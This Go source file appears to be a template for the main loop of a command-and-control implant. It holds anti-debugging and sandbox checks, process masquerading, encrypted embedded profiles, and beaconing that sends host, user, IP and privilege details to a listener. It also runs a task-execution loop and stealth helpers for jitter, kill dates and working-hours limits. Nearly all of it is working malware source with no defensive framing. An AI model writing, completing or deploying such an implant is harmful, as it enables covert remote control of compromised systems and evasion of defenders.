package main

import (
	crand "crypto/rand"
	"encoding/binary"
	"math/rand"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"sync"
	"time"

	"__NAME__/crypto"
	"__NAME__/impl"
	"__NAME__/protocol"
	// __EVASION_MAIN_IMPORT__
)

// ─── Global state ──────────────────────────────────────────────────────────────

var (
	agent impl.AgentImpl
	jobs  = impl.NewJobsController()

	stateMu     sync.RWMutex
	agentSleep  int   // seconds
	agentJitter int   // 0-90 %
	killDate    int64 // unix timestamp; 0 = disabled
	workStart   int   // HHMM e.g. 900
	workEnd     int   // HHMM e.g. 1700
)

// ─── Entry point ───────────────────────────────────────────────────────────────

func main() {
	if len(encProfiles) == 0 {
		os.Exit(1)
	}

	// Create the agent implementation.
	agent = impl.New()

	// Anti-analysis: user-defined debugger/sandbox detection.
	if agent.IsDebugged() {
		os.Exit(0)
	}

	// Process masquerade: user-defined technique.
	agent.Masquerade()

	// Custom startup hook: user-defined initialization.
	agent.OnStart()

	// __EVASION_INIT__

	// Iterate profiles: decrypt, parse, connect.
	for _, blob := range encProfiles {
		if len(blob) == 0 {
			continue
		}
		profile, sessionKey, err := parseEmbeddedProfile(blob)
		if err != nil {
			continue
		}
		crypto.SKey = sessionKey
		initProfileState(&profile)
		run(&profile, sessionKey)
	}
}

// initProfileState seeds the global stealth state from the embedded profile.
func initProfileState(p *protocol.Profile) {
	stateMu.Lock()
	defer stateMu.Unlock()
	agentSleep = p.Sleep
	agentJitter = p.Jitter
	killDate = p.KillDate
	workStart = p.WorkStart
	workEnd = p.WorkEnd
	if agentSleep <= 0 {
		agentSleep = 5
	}
}

// ─── Connection loop ───────────────────────────────────────────────────────────

func run(profile *protocol.Profile, listenerKey []byte) {
	connCount := 0
	for {
		if shouldExit() {
			os.Exit(0)
		}
		waitForWorkingHours()
		if len(profile.Addresses) == 0 {
			return
		}

		addr := profile.Addresses[connCount%len(profile.Addresses)]
		connCount++

		conn, err := agent.Dial(addr, profile)
		if err != nil {
			sleepWithJitter()
			continue
		}

		initMsg, err := buildInitMessage(profile, listenerKey)
		if err != nil {
			_ = conn.Close()
			sleepWithJitter()
			continue
		}

		enc, err := crypto.EncryptData(initMsg, listenerKey)
		if err != nil {
			_ = conn.Close()
			sleepWithJitter()
			continue
		}

		if err := protocol.SendMsg(conn, enc); err != nil {
			_ = conn.Close()
			sleepWithJitter()
			continue
		}

		taskLoop(conn, listenerKey)
		_ = conn.Close()
		sleepWithJitter()
	}
}

func taskLoop(conn net.Conn, sessionKey []byte) {
	for {
		if shouldExit() {
			return
		}
		waitForWorkingHours()

		data, err := protocol.RecvMsg(conn)
		if err != nil || data == nil {
			return
		}

		plaintext, err := crypto.DecryptData(data, sessionKey)
		if err != nil {
			return
		}

		var in protocol.Message
		if err := protocol.Unmarshal(plaintext, &in); err != nil {
			return
		}
		if in.Type != 1 {
			sleepWithJitter()
			continue
		}

		responses := TaskProcess(in.Object)
		if len(responses) > 0 {
			outMsg, err := protocol.Marshal(protocol.Message{Type: 1, Object: responses})
			if err != nil {
				return
			}

			enc, err := crypto.EncryptData(outMsg, sessionKey)
			if err != nil {
				return
			}

			if err := protocol.SendMsg(conn, enc); err != nil {
				return
			}

			sleepWithJitter()
			continue
		}

		jobResponses := drainAsyncJobObjects()
		if len(jobResponses) == 0 {
			sleepWithJitter()
			continue
		}

		outMsg, err := protocol.Marshal(protocol.Message{Type: 2, Object: jobResponses})
		if err != nil {
			return
		}

		enc, err := crypto.EncryptData(outMsg, sessionKey)
		if err != nil {
			return
		}

		if err := protocol.SendMsg(conn, enc); err != nil {
			return
		}

		sleepWithJitter()
	}
}

// ─── Registration ──────────────────────────────────────────────────────────────

func createInfo(sessionKey []byte) protocol.SessionInfo {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	cp := agent.GetCP()

	return protocol.SessionInfo{
		Process:    processName(),
		PID:        os.Getpid(),
		User:       username,
		Host:       hostname,
		Ipaddr:     localIPv4(),
		Elevated:   agent.IsElevated(),
		Acp:        cp,
		Oem:        cp,
		Os:         runtime.GOOS,
		OSVersion:  agent.GetOsVersion(),
		EncryptKey: sessionKey,
	}
}

func parseEmbeddedProfile(blob []byte) (protocol.Profile, []byte, error) {
	if len(blob) <= crypto.KeySize {
		return protocol.Profile{}, nil, os.ErrInvalid
	}
	key := append([]byte(nil), blob[:crypto.KeySize]...)
	plain, err := crypto.DecryptData(blob[crypto.KeySize:], key)
	if err != nil {
		return protocol.Profile{}, nil, err
	}
	var profile protocol.Profile
	if err := protocol.Unmarshal(plain, &profile); err != nil {
		return protocol.Profile{}, nil, err
	}
	return profile, key, nil
}

func buildInitMessage(profile *protocol.Profile, sessionKey []byte) ([]byte, error) {
	beat, err := protocol.Marshal(createInfo(sessionKey))
	if err != nil {
		return nil, err
	}
	initPackData, err := protocol.Marshal(protocol.InitPack{
		Id:   uint(randomUint32()),
		Type: profile.Type,
		Data: beat,
	})
	if err != nil {
		return nil, err
	}
	return protocol.Marshal(protocol.StartMsg{Type: protocol.INIT_PACK, Data: initPackData})
}

func randomUint32() uint32 {
	var buf [4]byte
	if _, err := crand.Read(buf[:]); err != nil {
		return uint32(rand.Int31())
	}
	return binary.BigEndian.Uint32(buf[:])
}

func localIPv4() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return ""
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			ipNet, ok := addr.(*net.IPNet)
			if !ok || ipNet.IP == nil {
				continue
			}
			if v4 := ipNet.IP.To4(); v4 != nil {
				return v4.String()
			}
		}
	}
	return ""
}

func processName() string {
	exe, err := os.Executable()
	if err != nil {
		return "__NAME__"
	}
	return filepath.Base(exe)
}

// ─── Stealth helpers ───────────────────────────────────────────────────────────

func sleepWithJitter() {
	stateMu.RLock()
	base := agentSleep
	jit := agentJitter
	stateMu.RUnlock()

	if base <= 0 {
		return
	}
	ms := base * 1000
	if jit > 0 && jit <= 90 {
		delta := ms * jit / 100
		ms += rand.Intn(2*delta+1) - delta
		if ms < 0 {
			ms = 100
		}
	}
	time.Sleep(time.Duration(ms) * time.Millisecond)
}

func shouldExit() bool {
	stateMu.RLock()
	kd := killDate
	stateMu.RUnlock()
	return kd > 0 && time.Now().Unix() > kd
}

func waitForWorkingHours() {
	for {
		stateMu.RLock()
		ws := workStart
		we := workEnd
		stateMu.RUnlock()

		if ws == 0 && we == 0 {
			return // no restriction
		}

		now := time.Now()
		hhmm := now.Hour()*100 + now.Minute()
		if ws <= we {
			// Normal window: e.g., 0900–1700
			if hhmm >= ws && hhmm < we {
				return
			}
		} else {
			// Overnight window: e.g., 2200–0600
			if hhmm >= ws || hhmm < we {
				return
			}
		}
		time.Sleep(60 * time.Second)
	}
}
